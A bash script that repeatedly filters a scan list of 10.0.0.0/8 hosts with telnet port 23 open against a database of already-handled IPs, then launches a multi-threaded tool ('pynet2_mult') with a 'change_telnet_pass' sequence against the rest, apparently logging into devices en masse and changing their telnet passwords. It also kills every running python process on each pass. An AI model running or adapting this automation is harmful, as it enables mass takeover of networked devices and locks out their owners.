#!/bin/bash

while true; do
	cont=1
	echo "[$cont]"
	let cont+=1

	scan_list="/media/Kali/home/grimaldi/Bash/Telnet/scans/crawling/ips_up_port_23_10.0.0.0_8/ips_up_port_23_10.0.0.0_8.198.clean"
	already_changed="/home/counter/scans/Telnet/already_telnet_changed_ips.txt"
	resultant_list="/home/counter/scans/Telnet/ips_up_port_23_10.0.0.0_8.198.clean_2"

	# Kill already existing
	ps aux | grep python | grep -v 'nvim|grep|exclude' | awk '{print $2}' | xargs kill
	echo "[*] Antiguos process killed."

	# Modify source list
	psql -U networker -d scan_private -t -A -c "SELECT ipv4_address FROM telnet_pass WHERE already_changed = true;" > ~/scans/Telnet/already_telnet_changed_ips.txt

	# Update the already telnet change ips
	grep -Fxv -f "$already_changed" "$scan_list" > "$resultant_list"

	# Begin the process again
	./pynet2_mult -iL "$resultant_list" -iC sequences/change_telnet_pass -n 16 -p 23 &
	echo "Multi processing logins are being performed..."
	sleep 150
done
